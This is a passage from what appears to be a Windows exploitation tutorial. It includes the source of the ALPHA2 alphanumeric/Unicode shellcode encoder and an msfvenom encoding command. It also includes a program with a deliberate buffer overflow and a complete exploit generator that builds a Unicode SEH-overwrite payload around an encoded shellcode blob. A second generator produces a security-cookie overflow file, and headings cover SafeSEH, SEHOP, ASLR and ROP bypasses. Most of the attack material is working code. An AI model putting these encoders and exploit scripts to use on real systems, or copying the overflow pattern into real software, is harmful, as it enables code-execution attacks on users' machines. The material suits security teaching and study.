&#123; &quot;[esp+C]&quot;, &quot;YYYYIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+10]&quot;, &quot;YYYYYIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+14]&quot;, &quot;YYYYYYIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+18]&quot;, &quot;YYYYYYYIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;seh&quot;, mixedcase_w32sehgetpc &quot;IIIIIIIIIIIIIIIII7QZ&quot; // ecx code mixedcase_ascii_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;, uppercase_ascii_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;IIIIIIIIIIII&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;IIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;JJJJJJJJJJJRY&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLYII7QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-C]&quot;, &quot;LLLLLLLLLLLLYIIII7QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-8]&quot;, &quot;LLLLLLLLYIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-4]&quot;, &quot;LLLL7YIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;YIIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+8]&quot;, &quot;YYYIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+C]&quot;, &quot;YYYYIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+10]&quot;, &quot;YYYYYIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+14]&quot;, &quot;YYYYYYIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+18]&quot;, &quot;YYYYYYYIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;seh&quot;, uppercase_w32sehgetpc &quot;IIIIIIIIIIIQZ&quot; // ecx code uppercase_ascii_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;, mixedcase_ascii_nocompress_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;7777777777777777777777777777777777777&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;77777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;77777777777777777777777777777777777RY&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLY777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-C]&quot;, &quot;LLLLLLLLLLLLY7777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-8]&quot;, &quot;LLLLLLLLY77777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-4]&quot;, &quot;LLLL7Y77777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;Y7777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+8]&quot;, &quot;YYY77777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+C]&quot;, &quot;YYYY7777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+10]&quot;, &quot;YYYYY777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+14]&quot;, &quot;YYYYYY77777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+18]&quot;, &quot;YYYYYYY7777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYY777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;seh&quot;, mixedcase_w32sehgetpc &quot;77777777777777777777777777777777777QZ&quot; // ecx code mixedcase_ascii_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;, uppercase_ascii_nocompress_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;777777777777777777777777&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;7777777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;7777777777777777777777RY&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLY77777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-C]&quot;, &quot;LLLLLLLLLLLLY777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-8]&quot;, &quot;LLLLLLLLY7777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp-4]&quot;, &quot;LLLL7Y7777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;Y777777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YY77777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+8]&quot;, &quot;YYY7777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+C]&quot;, &quot;YYYY777777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+10]&quot;, &quot;YYYYY77777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+14]&quot;, &quot;YYYYYY7777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+18]&quot;, &quot;YYYYYYY777777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYY77777777777777QZ&quot; uppercase_ascii_decoder_body &#125;, &#123; &quot;seh&quot;, uppercase_w32sehgetpc &quot;7777777777777777777777QZ&quot; // ecx code uppercase_ascii_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;, mixedcase_unicode_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;, uppercase_unicode_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PPYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;RRYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SSYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VVYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WWYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;YAIAIAIAIA44&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;, mixedcase_unicode_nocompress_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PPYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;RRYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SSYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VVYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WWYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;YA4444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;, uppercase_unicode_nocompress_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;44444444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PPYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;44444444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;RRYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SSYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TUYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UUYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VVYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WWYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;YA444444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YUYA4444444444&quot; uppercase_unicode_decoder_body &#125;, &#123; NULL, NULL &#125;&#125;;struct decoder* decoders[] = &#123; mixedcase_ascii_decoders, uppercase_ascii_decoders, mixedcase_unicode_decoders, uppercase_unicode_decoders, mixedcase_ascii_nocompress_decoders, uppercase_ascii_nocompress_decoders, mixedcase_unicode_nocompress_decoders, uppercase_unicode_nocompress_decoders&#125;;void version(void) &#123; printf( &quot;________________________________________________________________________________\\n&quot; &quot;\\n&quot; &quot; ,sSSs,,s, ,sSSSs, &quot; VERSION_STRING &quot;\\n&quot; &quot; SS\\&quot; Y$P\\&quot; SY\\&quot; ,SY \\n&quot; &quot; iS&#x27; dY ,sS\\&quot; Unicode-proof uppercase alphanumeric shellcode encoding.\\n&quot; &quot; YS, dSb ,sY\\&quot; &quot; COPYRIGHT &quot;\\n&quot; &quot; `\\&quot;YSS&#x27;\\&quot;S&#x27; &#x27;SSSSSSSP &lt;skylined@edup.tudelft.nl&gt;\\n&quot; &quot;________________________________________________________________________________\\n&quot; &quot;\\n&quot; ); exit(EXIT_SUCCESS);&#125;void help(char* name) &#123; printf( &quot;Usage: %s [OPTION] [BASEADDRESS]\\n&quot; &quot;ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\\n&quot; &quot;The result can optionaly be uppercase-only and/or unicode proof. It is a encoded\\n&quot; &quot;version of your origional shellcode. It consists of baseaddress-code with some\\n&quot; &quot;padding, a decoder routine and the encoded origional shellcode. This will work\\n&quot; &quot;for any target OS. The resulting shellcode needs to have RWE-access to modify\\n&quot; &quot;it&#x27;s own code and decode the origional shellcode in memory.\\n&quot; &quot;\\n&quot; &quot;BASEADDRESS\\n&quot; &quot; The decoder routine needs have it&#x27;s baseaddress in specified register(s). The\\n&quot; &quot; baseaddress-code copies the baseaddress from the given register or stack\\n&quot; &quot; location into the apropriate registers.\\n&quot; &quot;eax, ecx, edx, ecx, esp, ebp, esi, edi\\n&quot; &quot; Take the baseaddress from the given register. (Unicode baseaddress code using\\n&quot; &quot; esp will overwrite the byte of memory pointed to by ebp!)\\n&quot; &quot;[esp], [esp-X], [esp+X]\\n&quot; &quot; Take the baseaddress from the stack.\\n&quot; &quot;seh\\n&quot; &quot; The windows \\&quot;Structured Exception Handler\\&quot; (seh) can be used to calculate\\n&quot; &quot; the baseaddress automatically on win32 systems. This option is not available\\n&quot; &quot; for unicode-proof shellcodes and the uppercase version isn&#x27;t 100%% reliable.\\n&quot; &quot;nops\\n&quot; &quot; No baseaddress-code, just padding. If you need to get the baseaddress from a\\n&quot; &quot; source not on the list use this option (combined with --nocompress) and\\n&quot; &quot; replace the nops with your own code. The ascii decoder needs the baseaddress\\n&quot; &quot; in registers ecx and edx, the unicode-proof decoder only in ecx.\\n&quot; &quot;-n\\n&quot; &quot; Do not output a trailing newline after the shellcode.\\n&quot; &quot;--nocompress\\n&quot; &quot; The baseaddress-code uses \\&quot;dec\\&quot;-instructions to lower the required padding\\n&quot; &quot; length. The unicode-proof code will overwrite some bytes in front of the\\n&quot; &quot; shellcode as a result. Use this option if you do not want the \\&quot;dec\\&quot;-s.\\n&quot; &quot;--unicode\\n&quot; &quot; Make shellcode unicode-proof. This means it will only work when it gets\\n&quot; &quot; converted to unicode (inserting a &#x27;0&#x27; after each byte) before it gets\\n&quot; &quot; executed.\\n&quot; &quot;--uppercase\\n&quot; &quot; Make shellcode 100%% uppercase characters, uses a few more bytes then\\n&quot; &quot; mixedcase shellcodes.\\n&quot; &quot;--sources\\n&quot; &quot; Output a list of BASEADDRESS options for the given combination of --uppercase\\n&quot; &quot; and --unicode.\\n&quot; &quot;--help\\n&quot; &quot; Display this help and exit\\n&quot; &quot;--version\\n&quot; &quot; Output version information and exit\\n&quot; &quot;\\n&quot; &quot;See the source-files for further details and copying conditions. There is NO\\n&quot; &quot;warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\\n&quot; &quot;\\n&quot; &quot;Acknowledgements:\\n&quot; &quot; Thanks to rix for his phrack article on aphanumeric shellcode.\\n&quot; &quot; Thanks to obscou for his phrack article on unicode-proof shellcode.\\n&quot; &quot; Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\\n&quot; &quot;\\n&quot; &quot;Report bugs to &lt;skylined@edup.tudelft.nl&gt;\\n&quot;, name ); exit(EXIT_SUCCESS);&#125;//-----------------------------------------------------------------------------int main(int argc, char* argv[], char* envp[]) &#123; int uppercase = 0, unicode = 0, sources = 0, w32sehgetpc = 0, nonewline = 0, nocompress = 0, options = 0, spaces = 0; char* baseaddress = NULL; int i, input, A, B, C, D, E, F; char* valid_chars; // Random seed struct timeval tv; struct timezone tz; gettimeofday(&amp;tv, &amp;tz); srand((int)tv.tv_sec*1000+tv.tv_usec); // Scan all the options and set internal variables accordingly for (i=1; i&lt;argc; i++) &#123; if (strcmp(argv[i], &quot;--help&quot;) == 0) help(argv[0]); else if (strcmp(argv[i], &quot;--version&quot;) == 0) version(); else if (strcmp(argv[i], &quot;--uppercase&quot;) == 0) uppercase = 1; else if (strcmp(argv[i], &quot;--unicode&quot;) == 0) unicode = 1; else if (strcmp(argv[i], &quot;--nocompress&quot;) == 0) nocompress = 1; else if (strcmp(argv[i], &quot;--sources&quot;) == 0) sources = 1; else if (strcmp(argv[i], &quot;--spaces&quot;) == 0) spaces = 1; else if (strcmp(argv[i], &quot;-n&quot;) == 0) nonewline = 1; else if (baseaddress == NULL) baseaddress = argv[i]; else &#123; fprintf(stderr, &quot;%s: more then one BASEADDRESS option: `%s&#x27; and `%s&#x27;\\n&quot; &quot;Try `%s --help&#x27; for more information.\\n&quot;, argv[0], baseaddress, argv[i], argv[0]); exit(EXIT_FAILURE); &#125; &#125; // No baseaddress option ? if (baseaddress == NULL) &#123; fprintf(stderr, &quot;%s: missing BASEADDRESS options.\\n&quot; &quot;Try `%s --help&#x27; for more information.\\n&quot;, argv[0], argv[0]); exit(EXIT_FAILURE); &#125; // The uppercase, unicode and nocompress option determine which decoder we&#x27;ll // need to use. For each combination of these options there is an array, // indexed by the baseaddress with decoders. Pointers to these arrays have // been put in another array, we can calculate the index into this second // array like this: options = uppercase+unicode*2+nocompress*4; // decoders[options] will now point to an array of decoders for the specified // options. The array contains one decoder for every possible baseaddress. // Someone wants to know which baseaddress options the specified options // for uppercase, unicode and/or nocompress allow: if (sources) &#123; printf(&quot;Available options for %s%s alphanumeric shellcode:\\n&quot;, uppercase ? &quot;uppercase&quot; : &quot;mixedcase&quot;, unicode ? &quot; unicode-proof&quot; : &quot;&quot;); for (i=0; decoders[options][i].id != NULL; i++) &#123; printf(&quot; %s\\n&quot;, decoders[options][i].id); &#125; printf(&quot;\\n&quot;); exit(EXIT_SUCCESS); &#125; if (uppercase) &#123; if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; &#125; else &#123; if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;; else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;; &#125; // Find and output decoder for (i=0; strcasecmp(baseaddress, decoders[options][i].id) != 0; i++) &#123; if (decoders[options][i+1].id == NULL) &#123; fprintf(stderr, &quot;%s: unrecognized baseaddress option `%s&#x27;\\n&quot; &quot;Try `%s %s%s--sources&#x27; for a list of BASEADDRESS options.\\n&quot;, argv[0], baseaddress, argv[0], uppercase ? &quot;--uppercase &quot; : &quot;&quot;, unicode ? &quot;--unicode &quot; : &quot;&quot;); exit(EXIT_FAILURE); &#125; &#125; printf(&quot;%s&quot;, decoders[options][i].code); // read, encode and output shellcode while ((input = getchar()) != EOF) &#123; // encoding AB -&gt; CD 00 EF 00 A = (input &amp; 0xf0) &gt;&gt; 4; B = (input &amp; 0x0f); F = B; // E is arbitrary as long as EF is a valid character i = rand() % strlen(valid_chars); while ((valid_chars[i] &amp; 0x0f) != F) &#123; i = ++i % strlen(valid_chars); &#125; E = valid_chars[i] &gt;&gt; 4; // normal code uses xor, unicode-proof uses ADD. // AB -&gt; D = unicode ? (A-E) &amp; 0x0f : (A^E); // C is arbitrary as long as CD is a valid character i = rand() % strlen(valid_chars); while ((valid_chars[i] &amp; 0x0f) != D) &#123; i = ++i % strlen(valid_chars); &#125; C = valid_chars[i] &gt;&gt; 4; printf(&quot;%c%c&quot;, (C&lt;&lt;4)+D, (E&lt;&lt;4)+F); &#125; printf(&quot;A%s&quot;, nonewline ? &quot;&quot; : &quot;\\n&quot;); // Terminating &quot;A&quot; exit(EXIT_SUCCESS);&#125; Compile in Linux, but the shellcodes can be used in Windows.12$ gcc alpha2.c -o alpha2$ chmod +x ./alpha21$ ./alpha2 eax --unicode --uppercase &lt; messagebox.bin We can also use metasploit:1$ msfvenom -a x86 --platform -p windows/messagebox icon=warning text=&#x27;HelloWorld&#x27; title=&#x27;hello&#x27; -e x86/alpha_mixed -f c In conclusion, the main difficulties include: Using memory addresses in the form of 00mm00mm to overwrite the return address or SEH structure. Using assembly instructions that contain \\x00. Shellcode must be encoded using a special algorithm; however, this increases the length of the shellcode. Another problem is that offset patterns generated by Metasploit or Mona may be unreliable, since values stored in Unicode-based registers can be unpredictable. The following instructions are commonly used: Opcode Intruction 61 POPAD 006E00 ADD [ESI], CH 006F00 ADD [EDI], CH 007000 ADD [EAX], DH 007100 ADD [ECX], DH 007200 ADD [EDX], DH 007300 ADD [EBX], DH 0500QQ00PP ADD EAX, 0xPP00QQ00 2D00QQ00PP SUB EAX, 0xPP00QQ00 Practice1234567891011121314151617181920212223242526272829303132333435363738//vulnerable005.c#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char rock[0xE000] = &quot;...some data&quot;;char Rahab[0x2000] = &quot;\\x90\\x58\\x58\\xc3&quot;; //NOP/POP/POP/RETvoid foo(void *src_buf, size_t const len) &#123; size_t const BUF_LEN = 128; char bad_buf[BUF_LEN]; memcpy(bad_buf, src_buf, len * 2); //bad usage!&#125;int main(int argc, char *argv[]) &#123; size_t const STR_LEN = 4096; wchar_t *unicode_buf = malloc(STR_LEN); char ascii_buf[STR_LEN]; FILE *pfile; int rt; printf(&quot;Vulnerable005 starts...\\n&quot;); if (argc &gt;= 2) &#123; pfile = fopen(argv[1], &quot;r&quot;); fscanf(pfile, &quot;%s&quot;, ascii_buf); rt = MultiByteToWideChar(CP_UTF7, 0, ascii_buf, -1, unicode_buf, STR_LEN); if (rt == 0) &#123; return -1; &#125; foo(unicode_buf, rt * 2); &#125; printf(&quot;Vulnerable005 ends...\\n&quot;); free(unicode_buf);&#125; 1!mona pattern_create 3000 Right Click -> Follow address in stack Windows uses little-endian byte order. Therefore, the value used to overwrite the Next field is 0x43007900, and the value used to overwrite the Handler field is 0x36004300. Concatenate them together: 0x43007900_36004300.Remove the null bytes (\\x00): 0x43793643. 1!mona pattern_offset 43793643 Thus, the offset is 2298. Exploit script:12345678910111213141516171819202122232425262728293031323334353637//attack-vulnerable005.cpp#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;char code[] = &quot;PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYX4OM0KPKP30U9K5NQXRS44KR200TKB2LLDK0RN44KRRMXLOFW0JO6P1KONQ90FLOLS1SLLBNLMPGQHOLMKQ97Q9RUJOPRR74KPRN04KQ2OLM1Z0TKOP2XSUGPT4PLKQ8PDK0HLXTKQHMPM1Z30PSU7YSDOLQ9TKNTDKP1KOM1HVNQ7P7Q8OLMVLKQI7P8K0RUKDKSSMKHOKSMO4RUIP0X4KPXMTKQ9CRFDKLLPKDK1HMLM1HSTKLD4KKQ8PTI0DNDNDQKQK1QQIPZ0QKOYPR8QOPZ4KN2K93PKOKOKOQMYXLKKPM0KPCET31UT2NSOBNNS4BLBLM01XPL2WMVM7KOXU2JM0ZHLIKPKPM0OR0O16MP0T2ESC44KP9XLLM0KPM0PHS5BL2LROO0BW2OT2RLQTKPBJKPS815CSPVKWKOXU1ZKPQXZPH572R6KO8UA&quot;;int main() &#123; string const EXPLOIT_FILENAME = &quot;exploit-vulnerable005.txt&quot;; ofstream fout(EXPLOIT_FILENAME.c_str()); size_t const LENGTH = 2298; size_t const OFFSET = 124; string junk1(OFFSET, &#x27;A&#x27;); string shellcode(code); string junk2(LENGTH - junk1.size() - shellcode.size(), &#x27;B&#x27;); string next(&quot;\\x61\\x72&quot;); //0042 0042 string handler(&quot;\\x01\\x41&quot;); //00410001, Rahab string walkcode = &quot;\\x72&quot; &quot;\\x05\\x15\\x11&quot; &quot;\\x72&quot; &quot;\\x2D\\x11\\x11&quot; &quot;\\x72&quot; &quot;\\x50&quot; &quot;\\x72&quot; &quot;\\xC3&quot;; string exploit = junk1 + shellcode + junk2 + next + handler + walkcode; fout &lt;&lt; exploit;&#125; Practice——GOM PlayerChapter 6 - Offensive and Defensive6.1 - Security CookieCanary 12345678910111213141516171819202122232425262728293031//gf.cpp#include &lt;string&gt;void function_empty() &#123;&#125;void function_int_2() &#123; int ia[2] = &#123; 0 &#125;;&#125;void function_int_3() &#123; int ia[3] = &#123; 0 &#125;;&#125;void function_string() &#123; std::string s;&#125;void function_char_4(char* in) &#123; char ca[4](&quot;&quot;); std::strcpy(ca, in);&#125;void function_char_5(char* in) &#123; char ca[5](&quot;&quot;); std::strcpy(ca, in);&#125;int main() &#123; static char atk[] = &quot;AAAAAAAA&quot; &quot;BBBB&quot; &quot;\\xEF\\xBE\\xAD\\xDE&quot;; function_char_5(atk);&#125; Use the following command to disassemble a specified function (here u for unassemble, since d has been used for display).1uf function_string View the security with the followign command:1dd __security_cookie l1 It is a 4 or 8 bytes data. Let’s view function_empty1uf function_empty This function DOES NOT have Security Cookie mechanism. What if we turn off GS? Now, function_string DOES NOT have Security Cookie mechanism.10:000&gt; g Exploiting Security Cookie Platform IDE Windows XP SP3 x86 Visual Studio 2010 Express 12345678910111213141516171819//attack_sc.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;vulnerable_sc_exploit.txt&quot;int main() &#123; string global_junk(&quot;junk\\n&quot;); string local_junk(128 + 4 + 4, &#x27;A&#x27;); local_junk += &quot;\\xEF\\xBE\\xAD\\xDE&quot;; ofstream fout(FILENAME, ios::binary); fout &lt;&lt; global_junk &lt;&lt; local_junk; cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125; An Exception that can Bypass Security Cookie1 6.2 - Safe Virtual Function6.3 - SafeSEH6.4 - Exploiting SafeSEH6.5 - SEHOP6.6 - Exploiting SEHOP6.7 - DEP and ASLR6.8 - Exploiting ASLRExploit other DLL without SafeSEH or ASLR. 6.9 - Are Windows 8 and Windows 10 Safe?6.10 - ROP (Return-Oriented Programming)6.11 - Six Ways to Exploit 